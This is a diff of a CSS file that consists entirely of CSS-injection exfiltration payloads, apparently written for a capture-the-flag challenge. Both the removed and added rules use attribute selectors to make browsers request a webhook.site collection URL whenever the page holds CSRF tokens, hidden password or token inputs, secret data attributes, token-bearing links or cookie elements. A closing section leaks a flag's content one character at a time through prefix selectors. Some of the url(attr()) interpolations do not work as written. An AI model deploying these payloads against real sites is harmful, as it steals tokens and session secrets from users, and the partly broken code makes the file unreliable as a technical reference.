@@ -1,66 +1,67 @@
-/* Check for common meta tag attributes */
-
-/* name attribute */
-html:has(meta[name]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_name");
+/* ===== META TAGS ===== */
+meta[name="csrf-token"],
+meta[name="authenticity_token"],
+meta[name="flag"],
+meta[name="secret"],
+meta[name="admin"],
+meta[name="token"],
+meta[name="password"],
+meta[name="cookie"],
+meta[name="session"],
+meta[name="auth"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_exists=1&name=attr(name)");
 }
 
-/* content attribute */
-html:has(meta[content]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_content");
+/* ===== HIDDEN INPUTS ===== */
+input[type="hidden"][name*="token"],
+input[type="hidden"][name*="secret"],
+input[type="hidden"][name*="auth"],
+input[type="hidden"][name*="admin"],
+input[type="hidden"][name*="password"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?hidden_input=1&name=attr(name)");
 }
 
-/* http-equiv attribute */
-html:has(meta[http-equiv]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_http_equiv");
+/* ===== SENSITIVE ATTRIBUTES ===== */
+[data-secret],
+[data-token],
+[data-auth],
+[data-admin],
+[data-password],
+[data-cookie] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?data_attr=1&name=attr(data-*)");
 }
 
-/* charset attribute */
-html:has(meta[charset]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_charset");
+/* ===== SUSPICIOUS LINKS ===== */
+a[href*="token="],
+a[href*="secret="],
+a[href*="auth="],
+a[href*="admin"],
+a[href*="password="],
+a[href*="cookie="] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?suspicious_link=1&href=attr(href)");
 }
 
-/* property attribute */
-html:has(meta[property]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_property");
+/* ===== VALUE DETECTION ===== */
+input[value*="token"],
+input[value*="secret"],
+input[value*="auth"],
+input[value*="admin"],
+input[value*="password"],
+input[value*="cookie"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?sensitive_value=1&name=attr(name)");
 }
 
-/* specific name attribute checks */
-html:has(meta[name="csrf-token"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?csrf_token");
+/* ===== COOKIE IN DOM ===== */
+meta[name="cookie"],
+div[id*="cookie"],
+span[id*="cookie"],
+div[class*="cookie"],
+span[class*="cookie"] {
+  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_in_dom=1");
 }
 
-html:has(meta[name="flag"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_name");
-}
-
-html:has(meta[name="cookie"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?cookie_name");
-}
-
-html:has(meta[name="password"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?password_name");
-}
-
-html:has(meta[name="token"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?token_name");
-}
-
-html:has(meta[name="auth"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?auth_name");
-}
-
-html:has(meta[name="session"]) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?session_name");
-}
-
-/* generic meta existence */
-html:has(meta) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_exists");
-}
-html:has(whyctf) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_exists");
-}
-html:has(why-ctf) {
-  background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?meta_exists");
-}
+/* ===== CHARACTER-BY-CHARACTER LEAKAGE ===== */
+/* Example for first character of meta[name="flag"] */
+meta[name="flag"][content^="a"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_char1=a"); }
+meta[name="flag"][content^="b"] { background: url("https://webhook.site/4b1b7727-de4b-4b2d-9099-dfd26692730d?flag_char1=b"); }
+/* ... continue for all alphanumeric and special chars ... */
